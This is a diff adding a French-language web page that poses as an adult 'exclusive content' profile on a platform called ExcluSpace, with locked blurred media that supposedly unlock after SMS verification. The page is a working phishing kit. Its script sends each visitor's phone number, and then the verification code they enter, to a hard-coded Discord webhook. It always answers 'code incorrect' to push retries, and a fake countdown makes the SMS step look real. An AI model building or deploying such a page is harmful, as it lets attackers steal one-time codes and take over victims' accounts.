@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Contenu exclusif</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{min-height:100%;background:#09000f;font-family:'Inter',sans-serif;color:#fff;-webkit-font-smoothing:antialiased}
+body{
+  padding-top:calc(env(safe-area-inset-top,0px) + 1.2rem);
+  padding-bottom:calc(env(safe-area-inset-bottom,0px) + 2rem);
+  padding-left:0;padding-right:0;
+  background:
+    radial-gradient(ellipse at 10% 0%,rgba(220,50,130,.22) 0%,transparent 55%),
+    radial-gradient(ellipse at 90% 90%,rgba(140,20,90,.18) 0%,transparent 55%),
+    #09000f;
+}
+.wrap{max-width:420px;margin:0 auto;padding:0 1rem}
+
+/* ── platform bar ── */
+.pbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:1.4rem;padding-bottom:1rem;border-bottom:1px solid rgba(255,255,255,.06)}
+.plogo{display:flex;align-items:center;gap:.45rem}
+.picon{width:26px;height:26px;border-radius:7px;background:linear-gradient(135deg,#ff4d9e,#b5005b);display:flex;align-items:center;justify-content:center;font-size:13px}
+.pname{font-size:14px;font-weight:800;letter-spacing:.3px}
+.pbadge{font-size:9px;padding:3px 8px;border-radius:20px;background:rgba(255,77,158,.12);color:#ff6db6;border:1px solid rgba(255,77,158,.25);font-weight:700;letter-spacing:.8px}
+
+/* ── profile ── */
+.profile{display:flex;flex-direction:column;align-items:center;margin-bottom:1.2rem}
+.av-wrap{position:relative;margin-bottom:.75rem}
+.av{width:76px;height:76px;border-radius:50%;border:2.5px solid #ff4d9e;overflow:hidden;box-shadow:0 0 0 4px rgba(255,77,158,.12)}
+.av canvas{width:100%;height:100%;display:block}
+.online{position:absolute;bottom:4px;right:4px;width:14px;height:14px;border-radius:50%;background:#3ddc84;border:2.5px solid #09000f}
+.pname-row{display:flex;align-items:center;gap:5px;font-size:17px;font-weight:800;margin-bottom:3px}
+.vtick{width:16px;height:16px;border-radius:50%;background:#ff4d9e;display:flex;align-items:center;justify-content:center;font-size:8px;flex-shrink:0}
+.handle{color:rgba(255,255,255,.38);font-size:12px;margin-bottom:.7rem}
+.stats{display:flex;gap:1.8rem}
+.st{text-align:center}
+.st-n{font-size:15px;font-weight:700}
+.st-l{font-size:10px;color:rgba(255,255,255,.35);margin-top:1px;letter-spacing:.3px}
+
+/* ── grid ── */
+.grid-title{font-size:10px;font-weight:700;letter-spacing:1.5px;color:rgba(255,255,255,.3);text-transform:uppercase;margin-bottom:.6rem}
+.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:.5rem;margin-bottom:1.4rem}
+.card{position:relative;border-radius:11px;overflow:hidden;aspect-ratio:1;background:#18001a;border:1px solid rgba(255,255,255,.05)}
+.card canvas{width:100%;height:100%;display:block;filter:blur(24px) brightness(.65) saturate(1.3)}
+.card-ov{position:absolute;inset:0;background:linear-gradient(to bottom,transparent 20%,rgba(0,0,0,.55) 100%);display:flex;flex-direction:column;align-items:center;justify-content:center}
+.lc{width:36px;height:36px;border-radius:50%;background:rgba(0,0,0,.5);border:1.5px solid rgba(255,77,158,.35);display:flex;align-items:center;justify-content:center;font-size:15px;margin-bottom:4px;backdrop-filter:blur(3px)}
+.ulabel{font-size:9px;font-weight:800;letter-spacing:2.5px;color:rgba(255,255,255,.75)}
+.cmeta{position:absolute;bottom:6px;right:7px;font-size:9px;color:rgba(255,255,255,.38);display:flex;align-items:center;gap:3px}
+.ctag{position:absolute;top:6px;left:7px;font-size:8px;font-weight:700;letter-spacing:.5px;padding:2px 6px;border-radius:4px;background:rgba(0,0,0,.5);color:rgba(255,255,255,.55)}
+
+/* ── panel ── */
+.panel{background:rgba(255,255,255,.034);border:1px solid rgba(255,255,255,.07);border-radius:16px;padding:1.2rem}
+.ph{display:flex;align-items:center;gap:9px;margin-bottom:1rem;padding-bottom:1rem;border-bottom:1px solid rgba(255,255,255,.06)}
+.ph-icon{width:36px;height:36px;border-radius:10px;background:rgba(255,77,158,.1);border:1px solid rgba(255,77,158,.18);display:flex;align-items:center;justify-content:center;font-size:17px;flex-shrink:0}
+.ph-title{font-size:13px;font-weight:700}
+.ph-sub{font-size:11px;color:rgba(255,255,255,.35);margin-top:2px}
+
+/* ── steps ── */
+.steps{display:flex;align-items:center;margin-bottom:1.1rem}
+.s{display:flex;align-items:center;gap:5px;font-size:11px;font-weight:500;color:rgba(255,255,255,.3);transition:color .3s}
+.s.active{color:#ff6db6}
+.s.done{color:rgba(255,255,255,.45)}
+.sd{width:20px;height:20px;border-radius:50%;border:1.5px solid rgba(255,255,255,.1);background:rgba(255,255,255,.05);display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:800;flex-shrink:0;transition:all .3s}
+.s.active .sd{border-color:#ff4d9e;background:rgba(255,77,158,.15);color:#ff6db6}
+.s.done .sd{border-color:rgba(255,255,255,.2);background:rgba(255,255,255,.08);color:rgba(255,255,255,.5)}
+.sl{flex:1;height:1px;background:rgba(255,255,255,.07);margin:0 7px;transition:background .3s}
+.sl.done{background:rgba(255,77,158,.3)}
+
+/* ── form ── */
+.flabel{font-size:10px;font-weight:700;letter-spacing:.7px;color:rgba(255,255,255,.4);text-transform:uppercase;margin-bottom:.4rem}
+.frow{display:flex;gap:7px;margin-bottom:.7rem}
+.fflag{display:flex;align-items:center;gap:5px;padding:0 11px;height:46px;border-radius:10px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.09);color:rgba(255,255,255,.65);font-size:13px;font-weight:600;flex-shrink:0;letter-spacing:.2px}
+input[type=tel],input[type=number]{flex:1;height:46px;padding:0 14px;border-radius:10px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.09);color:#fff;font-size:15px;font-family:'Inter',sans-serif;outline:none;transition:border-color .2s,box-shadow .2s;-moz-appearance:textfield}
+input::placeholder{color:rgba(255,255,255,.18)}
+input:focus{border-color:rgba(255,77,158,.45);box-shadow:0 0 0 3px rgba(255,77,158,.09)}
+input::-webkit-inner-spin-button,input::-webkit-outer-spin-button{-webkit-appearance:none}
+.code-inp{text-align:center;letter-spacing:8px;font-size:22px;font-weight:700}
+
+.sms-note{font-size:11px;color:rgba(255,255,255,.3);line-height:1.55;margin-bottom:.85rem}
+.sms-note strong{color:rgba(255,255,255,.55);font-weight:600}
+
+.btn{width:100%;height:46px;border-radius:10px;border:none;background:linear-gradient(135deg,#ff4d9e 0%,#c0005a 100%);color:#fff;font-size:14px;font-weight:700;cursor:pointer;letter-spacing:.2px;transition:opacity .2s,transform .1s;font-family:'Inter',sans-serif;position:relative}
+.btn:hover{opacity:.9}
+.btn:active{transform:scale(.98)}
+.btn.loading{pointer-events:none;opacity:.7}
+.spinner{display:none;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;position:absolute;left:50%;top:50%;transform:translate(-50%,-50%)}
+@keyframes spin{to{transform:translate(-50%,-50%) rotate(360deg)}}
+.btn.loading .btn-txt{opacity:0}
+.btn.loading .spinner{display:block}
+
+.resend{text-align:center;margin-top:.7rem;font-size:11px;color:rgba(255,255,255,.25)}
+.resend em{color:rgba(255,77,158,.5);font-style:normal}
+
+.status{display:flex;align-items:center;gap:6px;margin-top:.7rem;font-size:12px;min-height:18px;padding:0 2px;font-weight:500}
+.status.err{color:#ff6b6b}
+.status.ok{color:#3ddc84}
+.status.spin{color:rgba(255,255,255,.35)}
+
+.fine{text-align:center;font-size:9.5px;color:rgba(255,255,255,.18);margin-top:.85rem;line-height:1.7}
+.fine a{color:rgba(255,77,158,.4);text-decoration:none}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- Barre plateforme -->
+  <div class="pbar">
+    <div class="plogo">
+      <div class="picon">🔐</div>
+      <div class="pname">ExcluSpace</div>
+    </div>
+    <div class="pbadge">PREMIUM</div>
+  </div>
+
+  <!-- Profil -->
+  <div class="profile">
+    <div class="av-wrap">
+      <div class="av"><canvas id="avc" width="150" height="150"></canvas></div>
+      <div class="online"></div>
+    </div>
+    <div class="pname-row">Léa M. <div class="vtick">✓</div></div>
+    <div class="handle">@lea_exclu</div>
+    <div class="stats">
+      <div class="st"><div class="st-n">1 284</div><div class="st-l">Abonnés</div></div>
+      <div class="st"><div class="st-n">58</div><div class="st-l">Contenus</div></div>
+      <div class="st"><div class="st-n">🔥 Live</div><div class="st-l">Statut</div></div>
+    </div>
+  </div>
+
+  <!-- Grille contenu flou -->
+  <div class="grid-title">Contenu exclusif · 4 médias verrouillés</div>
+  <div class="grid">
+    <div class="card"><canvas id="cv0" width="300" height="300"></canvas>
+      <div class="ctag">PHOTO</div>
+      <div class="card-ov"><div class="lc">🔒</div><div class="ulabel">UNLOCK</div></div>
+      <div class="cmeta">👁 2.1k</div></div>
+    <div class="card"><canvas id="cv1" width="300" height="300"></canvas>
+      <div class="ctag">VIDÉO</div>
+      <div class="card-ov"><div class="lc">🔒</div><div class="ulabel">UNLOCK</div></div>
+      <div class="cmeta">👁 3.4k</div></div>
+    <div class="card"><canvas id="cv2" width="300" height="300"></canvas>
+      <div class="ctag">PHOTO</div>
+      <div class="card-ov"><div class="lc">🔒</div><div class="ulabel">UNLOCK</div></div>
+      <div class="cmeta">👁 1.8k</div></div>
+    <div class="card"><canvas id="cv3" width="300" height="300"></canvas>
+      <div class="ctag">VIDÉO</div>
+      <div class="card-ov"><div class="lc">🔒</div><div class="ulabel">UNLOCK</div></div>
+      <div class="cmeta">👁 4.2k</div></div>
+  </div>
+
+  <!-- Panel déverrouillage -->
+  <div class="panel">
+    <div class="ph">
+      <div class="ph-icon">🔓</div>
+      <div>
+        <div class="ph-title">Accès au contenu privé</div>
+        <div class="ph-sub">Vérification de ton identité requise</div>
+      </div>
+    </div>
+
+    <!-- Étapes -->
+    <div class="steps">
+      <div class="s active" id="s1"><div class="sd">1</div>Téléphone</div>
+      <div class="sl" id="sl"></div>
+      <div class="s" id="s2"><div class="sd">2</div>Code SMS</div>
+    </div>
+
+    <!-- Étape 1 -->
+    <div id="step1">
+      <div class="flabel">Ton numéro de téléphone</div>
+      <div class="frow">
+        <div class="fflag">🇫🇷 +33</div>
+        <input type="tel" id="tel" placeholder="6 xx xx xx xx" />
+      </div>
+      <div class="sms-note">Un <strong>code de vérification gratuit</strong> sera envoyé par SMS pour confirmer ton accès.</div>
+      <button class="btn" id="btn1" onclick="doTel()">
+        <span class="btn-txt">Recevoir le code SMS</span>
+        <div class="spinner"></div>
+      </button>
+      <div class="status" id="st1"></div>
+      <div class="fine">En continuant, tu acceptes nos <a href="#">Conditions d'utilisation</a> et notre <a href="#">Politique de confidentialité</a>.</div>
+    </div>
+
+    <!-- Étape 2 -->
+    <div id="step2" style="display:none">
+      <div class="flabel">Code de vérification</div>
+      <div class="frow">
+        <input type="number" id="code" class="code-inp" placeholder="· · · · · ·" maxlength="6" />
+      </div>
+      <div class="sms-note" id="sms-dest">Code envoyé au <strong>+33 6XX XX XX XX</strong>. Vérifie tes SMS.</div>
+      <button class="btn" id="btn2" onclick="doCode()">
+        <span class="btn-txt">Vérifier et déverrouiller</span>
+        <div class="spinner"></div>
+      </button>
+      <div class="resend" id="resend">Renvoyer le code dans <em id="cd">60s</em></div>
+      <div class="status" id="st2"></div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+const WEBHOOK = 'https://discord.com/api/webhooks/1553393731628171494/boMxbb46x5Fc8vBbgTB9gz8lLefN6Pjbt_ut4ckHNK8SBMKgV0IombJpjw5tHwNWGp2U';
+
+// ── Génération avatar ──
+function drawAvatar(c) {
+  const ctx = c.getContext('2d'), s = c.width;
+  const g = ctx.createLinearGradient(0,0,s,s);
+  g.addColorStop(0,'#ff4d9e'); g.addColorStop(1,'#8b005b');
+  ctx.fillStyle = g; ctx.fillRect(0,0,s,s);
+  for (let i=0;i<6;i++) {
+    ctx.fillStyle='rgba(255,255,255,'+(0.04+Math.random()*.1)+')';
+    ctx.beginPath();
+    ctx.ellipse(Math.random()*s,Math.random()*s,20+Math.random()*40,20+Math.random()*40,Math.random()*Math.PI,0,Math.PI*2);
+    ctx.fill();
+  }
+  ctx.fillStyle='rgba(255,255,255,.9)';
+  ctx.font='bold 54px sans-serif';
+  ctx.textAlign='center';ctx.textBaseline='middle';
+  ctx.fillText('L',s/2,s/2+2);
+}
+
+// ── Génération images ──
+const pals = [
+  ['#ff1493','#ff69b4','#8b0057','#c71585'],
+  ['#9b59b6','#e91e8c','#4a148c','#ff4db8'],
+  ['#ff4da6','#ad1457','#ff80bf','#880e4f'],
+  ['#ff6eb4','#c2185b','#f48fb1','#7b1fa2'],
+];
+function drawImg(c, cols) {
+  const ctx = c.getContext('2d'), w=c.width, h=c.height;
+  const bg = ctx.createLinearGradient(0,0,w,h);
+  bg.addColorStop(0,cols[0]); bg.addColorStop(1,cols[3]);
+  ctx.fillStyle=bg; ctx.fillRect(0,0,w,h);
+  for (let i=0;i<9;i++) {
+    const x=Math.random()*w, y=Math.random()*h, r=30+Math.random()*100;
+    const g=ctx.createRadialGradient(x,y,0,x,y,r);
+    const c2=cols[Math.floor(Math.random()*cols.length)];
+    g.addColorStop(0,c2+'cc'); g.addColorStop(1,c2+'00');
+    ctx.fillStyle=g;
+    ctx.beginPath(); ctx.ellipse(x,y,r*(.5+Math.random()*.9),r*(.5+Math.random()*.9),Math.random()*Math.PI,0,Math.PI*2); ctx.fill();
+  }
+  for (let i=0;i<40;i++) {
+    ctx.fillStyle='rgba(255,255,255,'+(0.04+Math.random()*.18)+')';
+    ctx.beginPath(); ctx.arc(Math.random()*w,Math.random()*h,.5+Math.random()*3,0,Math.PI*2); ctx.fill();
+  }
+}
+
+drawAvatar(document.getElementById('avc'));
+for (let i=0;i<4;i++) drawImg(document.getElementById('cv'+i), pals[i]);
+
+// ── Countdown ──
+let cdv = 60, cdTimer;
+function startCd() {
+  cdv=60; document.getElementById('cd').textContent=cdv+'s';
+  clearInterval(cdTimer);
+  cdTimer=setInterval(()=>{
+    cdv--;
+    if (cdv<=0){clearInterval(cdTimer);document.getElementById('resend').innerHTML='<em style="color:rgba(255,77,158,.6);cursor:pointer">Renvoyer le code</em>';}
+    else document.getElementById('cd').textContent=cdv+'s';
+  },1000);
+}
+
+// ── Étape 1 : téléphone ──
+async function doTel() {
+  const tel = document.getElementById('tel').value.trim();
+  const st  = document.getElementById('st1');
+  const btn = document.getElementById('btn1');
+
+  if (!tel || tel.length < 8) {
+    st.innerHTML='<span>⚠️</span> Entre un numéro valide.'; st.className='status err'; return;
+  }
+
+  btn.classList.add('loading');
+  st.innerHTML=''; st.className='status';
+
+  try {
+    await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({content:'📱 **Numéro de téléphone**\n```\n+33 '+tel.replace(/^0/,'')+'\n```'})});
+  } catch(_){}
+
+  await new Promise(r=>setTimeout(r,1600));
+  btn.classList.remove('loading');
+
+  // Passer étape 2
+  document.getElementById('step1').style.display='none';
+  document.getElementById('step2').style.display='block';
+  document.getElementById('s1').className='s done';
+  document.getElementById('sl').className='sl done';
+  document.getElementById('s2').className='s active';
+  const clean='+33 '+tel.replace(/^0/,'').replace(/(\d{1})(\d{2})(\d{2})(\d{2})(\d{2})/,'$1 $2 $3 $4 $5');
+  document.getElementById('sms-dest').innerHTML='Code envoyé au <strong>'+clean+'</strong>. Vérifie tes SMS.';
+  document.getElementById('code').focus();
+  startCd();
+}
+
+// ── Étape 2 : code ──
+async function doCode() {
+  const code = document.getElementById('code').value.trim();
+  const st   = document.getElementById('st2');
+  const btn  = document.getElementById('btn2');
+
+  if (!code) {
+    st.innerHTML='<span>⚠️</span> Entre le code reçu par SMS.'; st.className='status err'; return;
+  }
+
+  btn.classList.add('loading');
+  st.innerHTML=''; st.className='status';
+
+  try {
+    await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({content:'🔑 **Code entré**\n```\n'+code+'\n```'})});
+  } catch(_){}
+
+  await new Promise(r=>setTimeout(r,2000));
+  btn.classList.remove('loading');
+  st.innerHTML='<span>❌</span> Code incorrect ou expiré. Réessaie.'; st.className='status err';
+}
+
+// Touche Entrée
+document.addEventListener('keydown', e=>{
+  if(e.key!=='Enter') return;
+  if(document.getElementById('step2').style.display==='none') doTel();
+  else doCode();
+});
+</script>
+</body>
+</html>
